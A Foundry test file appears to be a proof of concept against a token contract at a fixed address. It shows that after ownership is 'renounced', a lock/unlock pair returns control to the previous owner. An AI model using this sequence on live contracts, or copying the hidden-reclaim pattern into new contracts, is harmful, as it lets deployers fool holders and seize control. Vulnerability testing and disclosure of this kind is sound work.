```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";

interface INOMOS {
    function owner() external view returns (address);
    function lock(uint256 time) external;
    function renounceOwnership() external;
    function unlock() external;
    function getUnlockTime() external view returns (uint256);
    function getTime() external view returns (uint256);
}

contract ExploitTest is Test {
    address constant NOMOS = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    INOMOS nms;

    function setUp() public {
        nms = INOMOS(NOMOS);
        vm.label(NOMOS, "NOMOS");
    }

    function test_AccessControl_RenounceBypass() public {
        // Step 1: Set storage to make this contract the owner
        // Slot0 = _owner, Slot1 = _previousOwner, Slot2 = _lockTime
        vm.store(NOMOS, bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));
        vm.store(NOMOS, bytes32(uint256(1)), bytes32(uint256(uint160(address(0)))));
        vm.store(NOMOS, bytes32(uint256(2)), bytes32(uint256(0)));

        // Confirm we are owner
        assertEq(nms.owner(), address(this), "Should be owner after storage manipulation");

        // Step 2: Lock for 1 second (simulates owner intending to renounce later)
        nms.lock(1);

        // Step 3: Renounce ownership
        nms.renounceOwnership();
        assertEq(nms.owner(), address(0), "Owner should be zero after renounce");

        // Step 4: Warp past lock time
        vm.warp(block.timestamp + 2 seconds);

        // Step 5: Unlock – this should transfer ownership back to _previousOwner (which is us)
        nms.unlock();

        // Step 6: Verify owner is restored
        assertEq(nms.owner(), address(this), "Owner should be restored after unlock");
    }
}
```
